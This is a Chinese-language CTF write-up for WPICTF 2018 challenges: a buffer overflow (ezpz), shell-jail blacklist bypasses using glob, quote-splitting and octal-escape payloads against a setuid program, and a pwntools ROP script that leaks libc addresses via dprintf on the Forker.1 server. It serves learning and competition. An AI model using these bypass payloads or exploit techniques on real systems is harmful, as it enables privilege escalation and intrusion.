# WPICTF 2018 - Notes

## ezpz
直接丟到 ida pro 看程式碼可以知道

他一開始會要我們輸入一串密碼，然後和 "EZPZPASSWORD" 這個環境變數比對值

如果對的話，就呼叫 correct_pw() 這個函數來把 "EZPZPASSWORD" 的值印出來

而程式在一執行就會印出 correct_pw() 這個函數地址給我們，所以直接

overflow 後跳 correct_pw() 即可


## Shell-JAIL-1
> Description:
> 
> Download the login private key, then run:
> 
> ssh -p 31337 -i login shjail@shelljail1.wpictf.xyz
> 
> redundant servers on 31338 and 31339

題目給了一個 private key ，然後用此連上 server 


底下有三個檔案: access , access.c , flag.txt
```
28369edadf5f:/home/pc_owner$ ls -al
total 28
drwxr-xr-x    1 pc_owner pc_owner      4096 Apr 13 08:03 .
drwxr-xr-x    1 root     root          4096 Apr 13 08:03 ..
-r-sr-sr-x    1 pc_owner pc_owner     10880 Apr 13 08:03 access
-r--r--r--    1 pc_owner pc_owner      1005 Apr 13 04:50 access.c
-r--r-----    1 pc_owner pc_owner        23 Apr 13 04:50 flag.txt
```

那可以看到 access 有 setuid，然後看一下 access.c 可以知道

他會把我們的輸入，餵給 system 來執行，只要裡面的指令不在黑名單即可

```
28369edadf5f:/home/pc_owner$ ./access cat "fl?g.t?t"
wpi{MaNY_WayS_T0_r3Ad}
===
28369edadf5f:/home/pc_owner$ ./access "cat fla'g'.'t'xt"
wpi{MaNY_WayS_T0_r3Ad}

```

## Shell-JAIL-2
> Description:
> 
> Download the login private key, then run:
> 
> ssh -p 31337 -i login shjail@shelljail2.wpictf.xyz


一樣有三個檔案
```
54cd9d6b47ef:/home/pc_owner$ ls -al
total 28
drwxr-xr-x    1 pc_owner pc_owner      4096 Apr 13 08:03 .
drwxr-xr-x    1 root     root          4096 Apr 13 08:03 ..
-r-sr-sr-x    1 pc_owner pc_owner     10912 Apr 13 08:03 access
-r--r--r--    1 pc_owner pc_owner      1030 Apr 13 05:39 access.c
-r--r-----    1 pc_owner pc_owner        28 Apr 13 05:39 flag.txt
```

這題和第一題唯一的不同處在於其將 PATH 這個環境變數清空

所以直接用指令會不行，如
```
54cd9d6b47ef:/home/pc_owner$ ./access id
sh: id: not found
54cd9d6b47ef:/home/pc_owner$ ./access ls
sh: ls: not found
```

可以自己寫 code 驗證一下:
```
# a.c
#include <stdlib.h>
#include <stdio.h>

int main()
{
  setenv("PATH", "", 1);
  char *pathvar = getenv("PATH");
  printf("pathvar: %s\n", pathvar);
  return 0;
}
===
# gcc a.c -o a
# ./a
pathvar:

可以看到顯示為空，一般如果沒清空的話，大概會顯示如下:
pathvar: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```

在沒有環境變數的情況下，如你要使用 cat ，需要下 /bin/cat

但我們還是可以使用 $, \, ' ，所以可以把 / 換成 $'\57'

57 是 ord('/') 的八進制，也是可以改成十六進制，也就是 $'\x2f' 是一樣的

這樣就可以用第一題的 payload 了
```
54cd9d6b47ef:/home/pc_owner$ ./access "$'\57'bin$'\57'cat $'\57'hom'e'$'\57'pc_ow'n'er$'\57'fla'g'.tx't'"
wpi{p0s1x_sh3Lls_ar3_w13rD}

```

另解:
```
54cd9d6b47ef:/home/pc_owner$ ./access pwd
/home/pc_owner
```
我們可以使用 . (source)
```
54cd9d6b47ef:/home/pc_owner$ ./access . "fla?.?xt"
sh: flag.txt: line 1: wpi{p0s1x_sh3Lls_ar3_w13rD}: not found
```

## Forker.1
> Description:
>
> nc forker1.wpictf.xyz 31337
> 
> redundant servers on 31338 and 31339
> 
> Hint: ASLR is disabled on the server

這題保護全部沒開，根據題目提示也知道沒有 aslr

丟到 ida pro 看一下程式碼，可以知道會在本地開 31337 port 

然後密碼是 INTERNET_FUNNY_MUNNY

整個簡單使用過程如下:

```
## Server Side
$ ./a 
## 開 server

===

## Client Side
$ nc localhost 31337 ## connect to server 
Please enter the correct password to get my secret ltc info
Password:INTERNET_FUNNY_MUNNY
You got the password right!
My litecoin address is LNpECGn9in6BGC8eaK87QawjzAXaWMht2b
```

雖然他沒開 ASLR ，但我們不知道他的 libc.so (沒給)，所以還是需要先 leak

來算出他的 libc.so 版本，之後再 overflow 控 rip 來 get shell

唯一需要注意的是，我們在overflow 時，當蓋到 buf[77]會影響到 index

所以用 p64(0x4d) 把她設對，位置可以看  ida pro 上

```
__int64 __fastcall check_password(int input)
{
  int tmp_index; // eax@2
  char tmp; // [sp+1Fh] [bp-51h]@1
  char buf_1[76]; // [sp+20h] [bp-50h]@2
  int index; // [sp+6Ch] [bp-4h]@1
```


然後利用 dprintf() 來 leak information ，dprintf() 使用方式是

dprintf(fd, format) ，這題是 socket ，fd = 4 = accept ，所以可以用

dprintf(4, puts@got ) 這樣來 leak 


可以先這樣leak 兩個function 然後利用[網站](https://libc.blukat.me/?q=read%3A010%2Cputs%3A460&l=libc6_2.26-0ubuntu3_amd64)來找他的 libc

```python
#!/usr/bin/env python
from pwn import *
context.arch = 'amd64'
#r = remote('127.0.0.1', 31337)
r = remote('forker1.wpictf.xyz', 31337)
print "pid: ",proc.pidof(r)

password = "INTERNET_FUNNY_MUNNY"
pop_rdi = 0x0000000000400c13
pop_rsi_r15 = 0x0000000000400c11
puts_got = 0x0602020
read_got = 0x602050
dprintf_plt = 0x400800
raw_input("#")

trash = "a"*76+p64(0x4d)+"a"*4 
pad1 = flat([pop_rdi, 4, pop_rsi_r15, read_got, 0, dprintf_plt])

r.sendline(trash + pad1)
r.recvuntil("Password:")
addr = u64(r.recv(8).ljust(8, '\x00'))
print "addr: ",hex(addr)
r.interactive()
```


得到 libc 就可以去 get shell 了，只是自己沒學過 dup2 ...

solve.py 寫得很醜

[參考](https://ctftime.org/task/5877)





